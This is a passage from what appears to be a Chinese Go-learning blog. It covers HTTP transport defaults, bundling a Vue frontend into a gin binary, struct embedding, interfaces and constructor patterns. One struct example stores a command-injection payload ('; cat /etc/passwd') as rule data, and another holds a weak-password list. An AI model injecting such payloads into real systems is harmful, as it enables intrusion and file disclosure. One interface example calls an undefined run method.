<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//transport默认配置：</span></span><br><span class="line"><span class="keyword">var</span> DefaultTransport RoundTripper = &amp;Transport&#123;</span><br><span class="line">   Proxy: ProxyFromEnvironment,</span><br><span class="line">   DialContext: (&amp;net.Dialer&#123;</span><br><span class="line">      Timeout:   <span class="number">30</span> * time.Second,</span><br><span class="line">      KeepAlive: <span class="number">30</span> * time.Second,</span><br><span class="line">      DualStack: <span class="literal">true</span>,</span><br><span class="line">   &#125;).DialContext,</span><br><span class="line">   ForceAttemptHTTP2:     <span class="literal">true</span>,</span><br><span class="line">   MaxIdleConns:          <span class="number">100</span>,</span><br><span class="line">   IdleConnTimeout:       <span class="number">90</span> * time.Second,</span><br><span class="line">   TLSHandshakeTimeout:   <span class="number">10</span> * time.Second,</span><br><span class="line">   ExpectContinueTimeout: <span class="number">1</span> * time.Second,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="7、静态资源打包进二进制"><a href="#7、静态资源打包进二进制" class="headerlink" title="7、静态资源打包进二进制"></a>7、静态资源打包进二进制</h2><p>有时候二进制需要结合前端页面来进行展示，网上大多使用embed来嵌入静态文件，但在迁移部署的时候需要将二进制程序和静态前端页面一起打包，不光麻烦，看着也不够优雅，若只有一个二进制程序多省事(～￣▽￣)～</p>
<p>这时候需要将前端的静态文件打包进二进制中，即以golang的代码形式写入源码中</p>
<p>网上搜了搜，这里我使用的是第三方库github.com&#x2F;libragen&#x2F;felix，这个库能将静态前端页面进行打包成http.fileServer（具体原理详见参考链接），供gin以中间件的形式使用（中间件用于对HTTP Request请求进行拦截处理，类型为gin.HandlerFunc，函数类型），前端我是用的vue进行生成，打包过程如下：</p>
<p><strong>1）vue打包生成前端静态页面</strong>（不知道如何使用vue生成静态页面的麻烦自行百度，这里不多介绍）</p>
<p><strong>2）felix ginbin -s ${前端编译好的dist目录路径}</strong>  </p>
<p>-s 前端编译好的代码目录,也可以适用于普通的前端项目 -d输出go代码的目录(包),默认当前工作目录</p>
<p>打包好的部分代码如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打包完成后会生成felixbin目录，里面的gin_static.go即为生成的golang代码</span></span><br><span class="line"><span class="comment">// - felix</span></span><br><span class="line"><span class="comment">// - felixbin</span></span><br><span class="line"><span class="comment">//   -  gin_static.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gin中间件的处理函数，在配置gin的时候会用到</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGinStaticBinMiddleware</span><span class="params">(urlPrefix <span class="type">string</span>)</span></span> (gin.HandlerFunc, <span class="type">error</span>) &#123;</span><br><span class="line">	fs, err := create(zipData)   <span class="comment">// 创建http.fileServer文件系统</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	fileserver := http.FileServer(fs)</span><br><span class="line">	<span class="keyword">if</span> urlPrefix != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fileserver = http.StripPrefix(urlPrefix, fileserver)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		urlPath := strings.TrimSpace(c.Request.URL.Path)</span><br><span class="line">		<span class="keyword">if</span> urlPath == urlPrefix &#123;</span><br><span class="line">			urlPath = path.Join(urlPrefix, indexHtml)</span><br><span class="line">		&#125;</span><br><span class="line">		f, err := fs.Open(urlPath)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		fi, err := f.Stat()</span><br><span class="line">		<span class="keyword">if</span> strings.HasSuffix(urlPath,<span class="string">&quot;.html&quot;</span>)&#123;</span><br><span class="line">			c.Header(<span class="string">&quot;Cache-Control&quot;</span>,<span class="string">&quot;no-cache&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> || !fi.IsDir() &#123;</span><br><span class="line">			fileserver.ServeHTTP(c.Writer, c.Request)</span><br><span class="line">			c.Abort()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3）项目中创建并配置gin</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">r := gin.Default()</span><br><span class="line">binStaticMiddleware, err := felixbin.NewGinStaticBinMiddleware(<span class="string">&quot;/&quot;</span>)  <span class="comment">// 创建中间件</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">r.Use(binStaticMiddleware)   <span class="comment">// 使用创建的中间件</span></span><br><span class="line">api := r.server.Group(<span class="string">&quot;/_/api&quot;</span>)      <span class="comment">//创建后端接口 /_/api/get_status</span></span><br><span class="line">api.GET(<span class="string">&quot;/get_status&quot;</span>, getStatus)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getStatus</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.String(http.StatusOK, <span class="string">&quot;reverse platform running ok.&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://mojotv.cn/2019/07/27/how-to-serve-frontend-code-with-api-in-go">https://mojotv.cn/2019/07/27/how-to-serve-frontend-code-with-api-in-go</a></p>
<h2 id="8、结构体继承与组合"><a href="#8、结构体继承与组合" class="headerlink" title="8、结构体继承与组合"></a>8、结构体继承与组合</h2><p>如果一个struct嵌套了另一个匿名结构体，那么这个结构可以直接访问匿名结构体的方法，从而实现继承</p>
<p>如果一个struct嵌套了另一个有名的结构体，那么这个模式叫做组合，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> pluginBase <span class="keyword">struct</span> &#123;         </span><br><span class="line">	Enable <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pluginBase)</span></span> enabled() <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p.Enable</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pluginBase)</span></span> setEnabled(enable <span class="type">bool</span>) &#123;</span><br><span class="line">	p.Enable = enable</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> rule <span class="keyword">struct</span> &#123;</span><br><span class="line">	ruleName <span class="type">string</span></span><br><span class="line">	payload  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *rule)</span></span> getRuleName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> r.ruleName</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> cmdInjection <span class="keyword">struct</span> &#123;</span><br><span class="line">	pluginBase                    <span class="comment">// 匿名继承pluginBase结构体，可以直接使用pluginBase的enabled和setEnabled方法</span></span><br><span class="line">	name       <span class="type">string</span></span><br><span class="line">	injectRule rule               <span class="comment">// 嵌套有名的结构体，需要通过injectRule.getRuleName来调用方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cmdInjection)</span></span> getName() <span class="type">string</span> &#123;   <span class="comment">// cmdInjection本身的方法</span></span><br><span class="line">	<span class="keyword">return</span> c.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建结构体</span></span><br><span class="line">	injectRule := rule&#123;</span><br><span class="line">		ruleName: <span class="string">&quot;linux command inject&quot;</span>,</span><br><span class="line">		payload:  <span class="string">&quot;; cat /etc/passwd&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	cmdInjectPlugin := cmdInjection&#123;</span><br><span class="line">		name:       <span class="string">&quot;command injection&quot;</span>,</span><br><span class="line">		injectRule: injectRule,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(cmdInjectPlugin.getName())                   <span class="comment">// 调用cmdInjectPlugin本身的方法</span></span><br><span class="line">	fmt.Println(cmdInjectPlugin.injectRule.getRuleName())    <span class="comment">// 调用嵌套结构体injectRule的方法</span></span><br><span class="line">	fmt.Println(cmdInjectPlugin.enabled())                   <span class="comment">// 调用继承结构体pluginBase的方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">command injection</span><br><span class="line">linux command inject</span><br><span class="line"><span class="literal">false</span>         <span class="comment">// 没有对enable赋值，默认为false</span></span><br></pre></td></tr></table></figure>



<h2 id="9、golang接口"><a href="#9、golang接口" class="headerlink" title="9、golang接口"></a>9、golang接口</h2><p>golang中的接口是一个或多个方法签名的集合，只有方法声明，没有实现，没有数据字段</p>
<p>接口可以匿名嵌入其它接口，或嵌入到结构中</p>
<p>将结构体赋值给接口时，会发生拷贝，而<strong>接口内部存储的是指向这个复制品的指针，既无法修改复制品的状态，也无法获取指针</strong> </p>
<p>示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Test <span class="keyword">struct</span> &#123;</span><br><span class="line">	a <span class="type">int</span></span><br><span class="line">	b <span class="type">int</span></span><br><span class="line">	c <span class="keyword">interface</span>&#123;&#125;    <span class="comment">// 定义元素类型为接口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	b := Test&#123;a: <span class="number">1</span>&#125;</span><br><span class="line">	i = b</span><br><span class="line">	fmt.Println(i, b)     <span class="comment">// 输出i和b的值</span></span><br><span class="line">	fmt.Println(fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, &amp;b), fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, &amp;i))   <span class="comment">// 打印地址</span></span><br><span class="line">	b.b = <span class="number">2</span>               <span class="comment">// 修改原结构体的元素，接口的值不变</span></span><br><span class="line">	fmt.Println(i, b)</span><br><span class="line">    i = &amp;b                <span class="comment">// 当赋值为结构体b的指针时，接口和结构体指向的是同一个</span></span><br><span class="line">	i.(*Test).a = <span class="number">2</span></span><br><span class="line">	fmt.Println(fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, &amp;b), fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, i))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;<span class="number">1</span> <span class="number">0</span> &lt;<span class="literal">nil</span>&gt;&#125; &#123;<span class="number">1</span> <span class="number">0</span> &lt;<span class="literal">nil</span>&gt;&#125;</span><br><span class="line"><span class="number">0xc000024040</span> <span class="number">0xc0000100a0</span>    <span class="comment">// 打印接口i和结构体b的地址  接口内部存储的是指向这个复制品的指针</span></span><br><span class="line">&#123;<span class="number">1</span> <span class="number">0</span> &lt;<span class="literal">nil</span>&gt;&#125; &#123;<span class="number">1</span> <span class="number">2</span> &lt;<span class="literal">nil</span>&gt;&#125;      <span class="comment">// 原结构体b的值变了，但接口i不变</span></span><br><span class="line"><span class="number">0xc000024040</span> <span class="number">0xc000024040</span>    <span class="comment">// 接口赋值为指针时，两者指向一致</span></span><br></pre></td></tr></table></figure>

<p>当尝试通过接口来修改结构体的值时，会报错：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Test <span class="keyword">struct</span> &#123;</span><br><span class="line">	a <span class="type">int</span></span><br><span class="line">	b <span class="type">int</span></span><br><span class="line">	c <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	b := Test&#123;a: <span class="number">1</span>&#125;</span><br><span class="line">	i = b</span><br><span class="line">	i.(Test).a = <span class="number">1</span>                        <span class="comment">// 复制品不能通过接口赋值，接口赋值结构体指针的时候可以</span></span><br><span class="line">    fmt.Println(&amp;i.(Test).a)              <span class="comment">// 不能获取结构体内的元素的地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">./test.<span class="keyword">go</span>:<span class="number">174</span>:<span class="number">13</span>: cannot assign to i.(Test).a  </span><br><span class="line">./test.<span class="keyword">go</span>:<span class="number">178</span>:<span class="number">14</span>: cannot take the address of i.(Test).a  </span><br></pre></td></tr></table></figure>



<p>只要某个类型a拥有该接口b的所有方法签名（通过自己定义或者匿名继承都可，不懂继承的可见上面的第8条结构体继承与组合），即算实现该接口，无需显示声明实现了哪个接口，类型a也会被认为接口b类型，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> pluginBase <span class="keyword">struct</span> &#123;</span><br><span class="line">	Enable <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pluginBase)</span></span> enabled() <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p.Enable</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pluginBase)</span></span> setEnabled(enable <span class="type">bool</span>) &#123;</span><br><span class="line">	p.Enable = enable</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> plugin <span class="keyword">interface</span> &#123;                  <span class="comment">// 定义接口，声明需要实现enabled和setEnabled方法</span></span><br><span class="line">	enabled() <span class="type">bool</span></span><br><span class="line">	setEnabled(enable <span class="type">bool</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> cmdInjection <span class="keyword">struct</span> &#123;               <span class="comment">// 定义结构体cmdInjection，因为匿名继承了pluginBase结构体，也就继承了其方法</span></span><br><span class="line">	pluginBase                           <span class="comment">// 当然也可以cmdInjection自己定义enabled和setEnabled方法</span></span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cmdInjection)</span></span> getName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> c.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	plugins := []plugin&#123;&#125;                               <span class="comment">// 定义元素类型为plugin的切片</span></span><br><span class="line">	plugins = <span class="built_in">append</span>(plugins, &amp;cmdInjection&#123;           <span class="comment">// 因为cmdInjection实现了接口plugin声明的方法，所以cmdInjection被认为是plugin类型</span></span><br><span class="line">		name: <span class="string">&quot;command injection&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">for</span> _, plugin := <span class="keyword">range</span> plugins &#123;                  <span class="comment">// 通过循环遍历插件</span></span><br><span class="line">		plugin.run()                                  <span class="comment">// 运行插件</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">command injection</span><br></pre></td></tr></table></figure>

<p>在上面的代码中，比如我想定义很多插件，但每个插件都有自己定义的结构体，想使用统一的切片来储存初始化后的插件，但golang中需要对切片的元素类型进行声明，就可以使用上面的方法：统一定义一个plugin的接口（有点类似于基类），下面的各种不同的插件（例如cmdInjection插件，有点像子类）实现plugin接口声明的方法，使用统一的切片[]plugin来保存初始化后的插件，后续可以通过循环来调用插件的方法，这样代码看起来就很优雅O(∩_∩)O</p>
<h2 id="10、golang结构体的初始化"><a href="#10、golang结构体的初始化" class="headerlink" title="10、golang结构体的初始化"></a>10、golang结构体的初始化</h2><p>目前我见到的结构体初始化赋值的方法大概分为3类：</p>
<p><strong>1）创建结构体时进行赋值（若引用外部package的结构体，只能赋值首字母大写的成员变量）</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> test <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    output <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t := test&#123;</span><br><span class="line">    Name: <span class="string">&quot;test&quot;</span>,   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>2） 通过构造函数（若外部package定义的结构体中有私有变量(首字母小写)，可以通过这个方法，但构造函数名首字母需大写）</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目录结构：</span></span><br><span class="line"><span class="comment">// - test1</span></span><br><span class="line"><span class="comment">//   - test1.go</span></span><br><span class="line"><span class="comment">// - test2</span></span><br><span class="line"><span class="comment">//   - test2.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// test1.go</span></span><br><span class="line"><span class="keyword">package</span> test1</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> test <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    private <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTest</span><span class="params">(name, private <span class="type">string</span>)</span></span> *test &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;test&#123;</span><br><span class="line">        Name: name,</span><br><span class="line">        private: private,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test2.go</span></span><br><span class="line"><span class="keyword">package</span> test2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;test1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">()</span></span> &#123;</span><br><span class="line">    test1 := test1.NewTest(<span class="string">&quot;test1&quot;</span>, <span class="string">&quot;private&quot;</span>)</span><br><span class="line">    fmt.Println(test1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>3）通过另类的构造函数（这里仅记录方法，看着比较优雅）</strong></p>
<p>golang中可以给变量定义为函数类型，函数的返回值也可以是函数类型</p>
<p>可以定义赋值函数，再将赋值函数传入构造函数中，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> PoCMon <span class="keyword">struct</span> &#123;</span><br><span class="line">    passwords []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PocMonOption <span class="function"><span class="keyword">func</span><span class="params">(p *PoCMon)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithPasswords</span><span class="params">(passwords []<span class="type">string</span>)</span></span> PocMonOption &#123;          <span class="comment">// 定义并返回赋值函数，在赋值函数中设置结构体变量的值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *PoCMon)</span></span> &#123;</span><br><span class="line">        p.passwords = passwords</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewPoCMon 根据选项生成PoCMon实例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewPoCMon</span><span class="params">(options ...PocMonOption)</span></span> *PoCMon &#123;                <span class="comment">// 结构体构造函数，传参赋值函数</span></span><br><span class="line">    p := &amp;PoCMon&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> _, option := <span class="keyword">range</span> options &#123;</span><br><span class="line">        option(p)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">password := []<span class="type">string</span>&#123;<span class="string">&quot;123456&quot;</span>, <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">p = NewPoCMon(                               <span class="comment">// 调用构造函数，参数为赋值函数</span></span><br><span class="line">        WithPasswords(password),              <span class="comment">// 传参赋值函数</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BC%80%E5%8F%91/" rel="tag">开发</a></li></ul>

    </footer>
  </div>

   
    
</article>

    
    <article
  id="post-study-golang-record-1"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/05/study-golang-record-1/"
    >Golang学习记录之一</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/05/study-golang-record-1/" class="article-date">
  <time datetime="2022-04-05T07:13:22.000Z" itemprop="datePublished">2022-04-05</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>​最近在学习golang，在学习过程中记录一下遇到过的那些坑以及一些个人使用的第三方库</p>
<p>​由于遇到的坑有点多，故分成几篇进行记录，后面遇到的坑 or 小技巧也会进行补充 (&#x3D;￣ω￣&#x3D;)</p>
<h2 id="1、值传递-amp-amp-查看变量类型"><a href="#1、值传递-amp-amp-查看变量类型" class="headerlink" title="1、值传递 &amp;&amp; 查看变量类型"></a>1、值传递 &amp;&amp; 查看变量类型</h2><p>golang在进行函数调用时，默认使用值传递，即在子函数内对参数变量进行修改不影响父函数中变量的值</p>
<p>但有一些类型的变量是引用类型的，包括Slice、Map和Channel类型，即函数内的修改仍然会影响函数外的值</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	param1 := <span class="string">&quot;hello world!&quot;</span></span><br><span class="line">	param2 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)   <span class="comment">// make函数返回的是一个hmap类型的指针*hmap，为指针类型</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;param1 address in main: %p\n&quot;</span>, &amp;param1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in main: %p\n&quot;</span>, param2)</span><br><span class="line">	test(param1, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(param1 <span class="type">string</span>, param2 <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param1 address in test: %p\n&quot;</span>, 